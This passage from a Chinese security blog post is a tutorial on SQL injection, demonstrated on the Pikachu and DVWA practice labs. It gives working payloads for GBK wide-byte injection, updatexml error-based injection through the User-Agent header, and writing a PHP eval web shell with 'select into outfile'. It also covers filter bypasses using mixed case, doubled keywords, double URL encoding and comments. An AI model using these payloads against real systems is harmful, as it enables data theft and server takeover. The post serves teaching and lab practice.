+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1）kobe%df&#x27; or 1=1# //用户在前端输入</span><br><span class="line">2）kobe%df\&#x27; or 1=1# //addslashes()函数对用户输入进行检测，在单引号前面添加转义符</span><br><span class="line">\</span><br><span class="line">kobe%df%5c%27 or 1=1# //转义符 \ 编码成为%5c</span><br><span class="line">%df%5c = 運 //到达数据库，GBK编码</span><br><span class="line">3)kobe運&#x27; or 1=1#</span><br><span class="line">select id,email from member where username=&#x27;kobe運&#x27; or 1=1#&#x27; //从单引号中逃逸出来</span><br></pre></td></tr></table></figure>
+
+<p>[GBK 编码范围, GBK 编码表 (qqxiuzi.cn)](<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK%E7%BC%96%E7%A0%81%EF%BC%8C%E6%98%AF%E5%AF%B9GB2312%E7%BC%96%E7%A0%81%E7%9A%84%E6%89%A9%E5%B1%95%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%AE%8C%E5%85%A8%E5%85%BC%E5%AE%B9GB2312-80%E6%A0%87%E5%87%86%E3%80%82,GBK%E7%BC%96%E7%A0%81%E4%BE%9D%E7%84%B6%E9%87%87%E7%94%A8%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%E6%96%B9%E6%A1%88%EF%BC%8C%E5%85%B6%E7%BC%96%E7%A0%81%E8%8C%83%E5%9B%B4%EF%BC%9A8140%EF%BC%8DFEFE%EF%BC%8C%E5%89%94%E9%99%A4xx7F%E7%A0%81%E4%BD%8D%EF%BC%8C%E5%85%B123940%E4%B8%AA%E7%A0%81%E4%BD%8D%E3%80%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK编码，是对GB2312编码的扩展，因此完全兼容GB2312-80标准。,GBK编码依然采用双字节编码方案，其编码范围：8140－FEFE，剔除xx7F码位，共23940个码位。</a> 共收录汉字和图形符号21886个，其中汉字（包括部首和构件）21003个，图形符号883个。)</p>
+<p>原理：前端输入 %df%27 时首先经过 addslashes() 函数转义变成了 %df%5c%27 （ %5c 是反斜杠 \ )， 之后在数据库查询前因为设置了GBK编码，即在汉字编码范围内两个字节都会被重新编码为一个汉字。 然后MySQL服务器就会对查询语句进行GBK编码，即 %df%5c 转换成了汉字”運”，使得单引号成功逃 逸，进而实现SQL注入漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27 ===&gt; addslashes函数 ===&gt; %df%5c%27 ===&gt; 数据库GBK ===&gt; 運&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709224224722.png" alt="image-20240709224224722"></p>
+<h2 id="http-header-和-cookie注入"><a href="#http-header-和-cookie注入" class="headerlink" title="http header 和 cookie注入"></a>http header 和 cookie注入</h2><p>HTTP头注入其实并不是一个新的SQL注入类型,而是指出现SQL注入漏洞的场景,有些时候,后台开发人员为了验证客户端头信息(比如常用的cookie验证),或者通过http header头信息获取客户端的一些资料–比如useragent、acceept字段等，会获取客户端的http header字段内容并用SQL进行处理，如果没有足够的安全检验则会导致对应的SQL注入漏洞。</p>
+<p>进入pikachu的http header来进行一下测试:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225102261.png" alt="image-20240709225102261"></p>
+<p>通过提示 ，我们通过基本的admin&#x2F;123456登录，并获得下列信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225244173.png" alt="image-20240709225244173"></p>
+<p>通过登录进去的信息可以猜测，系统后端是不是对http header里面的数据进行了获取，可能也进行了相 关数据库的操作。我们来看一下刚才的抓包，将它发送到Repeater里面，将User-Agent的值删掉，自己 构造一个，还是按照之前的思路，先输入一个单引号：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710101424266.png" alt="image-20240710101424266"></p>
+<p>这个时候发现引发了报错，因此这里基本确定了这里存在http header注入漏洞了，合理猜测数据库使用了insert（）函数进行处理，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里开始解释这个payload</p>
+<h3 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h3><h4 id="1-SQL-注入和报错利用"><a href="#1-SQL-注入和报错利用" class="headerlink" title="1. SQL 注入和报错利用"></a>1. SQL 注入和报错利用</h4><p>SQL 注入攻击不仅仅是为了修改或读取数据，还可以通过触发错误来泄露数据库内部信息。通过这种方法，攻击者可以获得数据库的架构信息、版本信息等。</p>
+<h4 id="2-updatexml-函数的使用"><a href="#2-updatexml-函数的使用" class="headerlink" title="2. updatexml 函数的使用"></a>2. <code>updatexml</code> 函数的使用</h4><p><code>updatexml</code> 是一个 MySQL 函数，通常用于处理 XML 数据。当它的参数不合法时，会触发错误消息。攻击者可以利用这一点，将有用的信息嵌入到错误消息中。</p>
+<h4 id="3-报错示例"><a href="#3-报错示例" class="headerlink" title="3. 报错示例"></a>3. 报错示例</h4><p>假设你的 SQL 查询如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sql</span><br><span class="line">复制代码</span><br><span class="line">INSERT INTO logs (user_agent) VALUES (&#x27;&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>updatexml(1,concat(0x7e,database()),0)</code> 部分会触发错误，因为 <code>updatexml</code> 期望的是 XML 文档，但这里传入的是不合法的参数 <code>1</code>。因此，MySQL 会返回一个错误，错误消息中包含了 <code>concat(0x7e,database())</code> 的结果。</p>
+<h3 id="触发错误和提取信息"><a href="#触发错误和提取信息" class="headerlink" title="触发错误和提取信息"></a>触发错误和提取信息</h3><p>当上述 SQL 查询执行时，由于 <code>updatexml</code> 函数的参数不合法，MySQL 会生成错误消息。错误消息中将包含 <code>concat(0x7e,database())</code> 的结果，其中 <code>0x7e</code> 是 ASCII 码 <code>~</code>，而 <code>database()</code> 函数返回当前数据库的名称。</p>
+<p>错误消息可能类似于：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~current_database_name&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，错误消息泄露了当前数据库的名称 <code>current_database_name</code>。</p>
+<h3 id="为什么需要or"><a href="#为什么需要or" class="headerlink" title="为什么需要or"></a>为什么需要<code>or</code></h3><p><code>or</code>在这里的主要作用是确保注入的代码在逻辑上总是会被评估并执行。即使前面的条件为假（例如空字符串），<code>or</code>会导致SQL引擎继续评估后面的条件。在这个特定的payload中，<code>updatexml</code>函数被设计为引发错误，从而泄露数据库名称。</p>
+<h1 id="从MYSQL注入到GetShell"><a href="#从MYSQL注入到GetShell" class="headerlink" title="从MYSQL注入到GetShell"></a>从MYSQL注入到GetShell</h1><p>Mysql支持向外写文件,这里的外指的是服务器的外部,需要用到</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">into</span> outfile</span><br></pre></td></tr></table></figure>
+
+<p>这个命令的作用是将被选择的一行代码写入一个文件中,文件被创建到服务器上,</p>
+<p><strong>其中 select into outfile的使用前提是</strong></p>
+<p>(1)要知道网站的绝对路径,可以通过开源程序,报错,phpinfo,404页面等一些方式做基本的信息收集</p>
+<p>(2)对目录要有写权限,一般image之类的存放图片的目录y欧写入权限</p>
+<p>(3)要有mysql file权限,即(能否对系统的文件读取和写操作),默认情况下只有root权限有, <strong>WARING:写的文件名一定是在网站中不存在的,不然会失败</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,&quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/shell2.php</span><br></pre></td></tr></table></figure>
+
+<p>在DVWA Low等级的SQL injection中如此输入,后续访问对应的网站目录,可以发现成功注入,并通过蚁剑弹shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710103522276.png" alt="image-20240710103522276"></p>
+<h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><p>绕过的姿势很多,这里介绍几种</p>
+<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>用于只针对于小写或大写的关键字匹配技术,正则表达式&#x2F;express&#x2F;i 表达大小写不敏感,即无法绕过,这是最简单的绕过方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<h2 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h2><p>一般情况下大小写转换无法绕过,而且正则表达式会替换或山粗和select,union这些比较危险的关键字,如果只匹配一次–(也就是不做二次校验,只删去一层危险关键字便通过用户的操作)–只需要<strong>双写关键字</strong>就很容易绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">举例：z.com<span class="operator">/</span>index.php?page_id<span class="operator">=</span><span class="number">-15</span> UNIunionON SELselectECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>在浏览器中输入一个连接,浏览器会对非保留字符进行URL编码</p>
+<p>空格-%20</p>
+<p>单引号-%27</p>
+<p>左右括号分别是%28 %29</p>
+<p><strong>普通的URL编码可能无法实现绕过，需要结合实际场景来判断</strong></p>
+<p><strong>比方说URL编码只进行了一次过滤，就可以再编码一次双重编码绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%2527id=1%252f%252a*/UNION%252f%252a%252a/SELECT</span><br></pre></td></tr></table></figure>
+
+<p>首先，我们需要理解URL编码。<code>%25</code>是<code>%</code>的URL编码。因此，<code>%2527</code>解码后是<code>%27</code>，<code>%252f</code>解码后是<code>%2f</code>，<code>%252a</code>解码后是<code>%2a</code>。</p>
+<h3 id="解码后的payload"><a href="#解码后的payload" class="headerlink" title="解码后的payload"></a>解码后的payload</h3><p>通过一次URL解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">1%27id=1%2f%2a*/UNION%2f%2a%2a/SELECT</span><br></pre></td></tr></table></figure>
+
+<p>再次URL解码后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;id=1/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>
+
+<h3 id="详细解析"><a href="#详细解析" class="headerlink" title="详细解析"></a>详细解析</h3><ol>
+<li>**<code>1&#39;</code>**：这是一个单引号，通常用于结束字符串字面值，打开可能的SQL注入点。</li>
+<li>**<code>id=1</code>**：这是一个常规的条件部分，可能是为了符合预期的SQL查询语法。</li>
+<li>**<code>/\*/UNION/\**/SELECT</code>**：这是注入的主要部分，其中使用了SQL注释语法<code>/* ... */</code>来插入注释。</li>
+</ol>
+<h3 id="绕过防护机制"><a href="#绕过防护机制" class="headerlink" title="绕过防护机制"></a>绕过防护机制</h3><ol>
+<li><p><strong>注释绕过</strong></p>
+<p><code>/*</code>和<code>*/</code>是SQL中的多行注释符号。攻击者利用这些注释符号来分割注入的关键字，使得简单的防护机制难以检测到关键字（如<code>UNION</code>和<code>SELECT</code>）的完整匹配。</p>
+<p>在这个例子中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>
+
+<p>这实际上是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ UNION / SELECT</span><br></pre></td></tr></table></figure>
+
+<p>由于注释的存在，防护机制可能无法检测到完整的<code>UNION SELECT</code>关键字，从而绕过防护。</p>
+</li>
+</ol>
+<h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>顾名思义用16进制转义</p>
+<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710104600689.png" alt="image-20240710104600689"></h2><h2 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105238466.png" alt="image-20240710105238466"></p>
+<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105608748.png" alt="image-20240710105608748"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/source/categories/Application-vulnerabilities/">Application vulnerabilities</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/source/tags/OWASP/">OWASP</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2024 Satoru
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
